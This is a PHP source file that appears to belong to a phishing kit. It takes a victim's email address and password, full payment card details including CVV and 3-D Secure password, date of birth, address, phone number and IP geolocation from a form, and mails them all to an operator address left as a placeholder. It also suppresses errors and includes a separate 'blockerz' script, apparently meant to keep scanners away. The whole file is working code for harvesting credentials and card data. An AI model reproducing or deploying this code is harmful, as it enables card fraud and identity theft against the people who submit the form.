<?php @error_reporting(0);

define('Secure', TRUE);
session_start();

include '../blockerz/index.php';


if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['firstname']) && isset($_POST['lastname']) && isset($_POST['birthday']) && isset($_POST['tel']) && isset($_POST['address1'])  && isset($_POST['city']) && isset($_POST['zipcode']) && isset($_POST['country']) && isset($_POST['cardholder']) && isset($_POST['holderaddress']) && isset($_POST['cardnum']) && isset($_POST['cvv']) && isset($_POST['expiration']) && (isset($_POST['VBV']) || isset($_POST['noVBV']))){


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message = "";
$message .= "====================================================\n";
$message .= "                      Input                       \n";
$message .= "\n";
$message .= ' E-mail          : '. $_POST['username']."\n";
$message .= ' E-mail Pass     : '. $_POST['password']."\n" ;
$message .= "====================================================\n";
$message .= ' Card holders Name     : '. $_POST['cardholder']."\n"  ;
$message .= ' Card holders Address  : '. $_POST['holderaddress']."\n"  ;
$message .= ' Credt Card Number     : '. $_POST['cardnum']."\n"  ;
$message .= ' Ex Date               : '. $_POST['expiration']."\n"  ;
$message .= ' Cvv                   : '. $_POST['cvv']."\n"  ;
$message .= ' 3d Password           : '. $_POST['VBV']."\n"  ;
$message .= "\n";
$message .= ' Card Holder   : '. $_POST['firstname'].' '. $_POST['lastname'].' '.$_POST['middlename']."\n";
$message .= ' Adress        : '. $_POST['address1']."\n"  ;
$message .= ' Adress 2      : '. $_POST['address2']."\n"  ;
$message .= ' City          : '. $_POST['city']."\n" ;
$message .= ' Zip Code      : '. $_POST['zipcode']."\n" ;
$message .= ' Country       : '. $_POST['country']."\n" ;
$message .= ' Date Of Birth : '. $_POST['birthday']."\n"  ;
$message .= ' Phone         : '. $_POST['tel']."\n" ;
$message .= "====================================================\n";
$message .= "                 According to : API and PHP           \n";
$message .= "\n";
$message .= " IP Address (PHP)   :  $ip\n";
$message .= " HostName (PHP)     :  $hostname\n";
$message .= " Browser            : ".$_POST["browser"]."\n";
$message .= ' Country            : '.$_POST['apiCountry']."\n";
$message .= ' IP Address         : '  .$_POST['ip']."\n";
$message .= ' Region             : '.$_POST['region']."\n";
$message .= ' Time Zone          : '.$_POST['timezone']."\n";
$message .= ' Org | ISP          : '.$_POST['org']."\n";
$message .= ' Zip Code           : '.$_POST['postal']."\n";
$message .= "====================================================\n";

$to="your email goes here";
$subject = "Your Stuff here";
$headers = "From: You";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message, $headers);
session_unset();
session_destroy();

}
?> 